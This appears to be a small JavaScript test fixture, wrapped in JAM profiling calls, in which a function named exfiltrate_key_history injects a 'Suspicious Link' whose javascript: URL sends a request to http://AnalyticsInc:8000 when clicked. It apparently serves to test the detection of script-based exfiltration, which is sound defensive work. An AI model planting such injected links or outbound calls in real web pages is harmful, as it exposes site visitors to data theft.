
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link", true);xmlhttp.send(null);';
  var link = document.createElement("a");
  link.href = "javascript:" + exp;
  link.innerHTML = "Suspicious Link";
  link.id = "mylink";
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  v0.appendChild(link);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
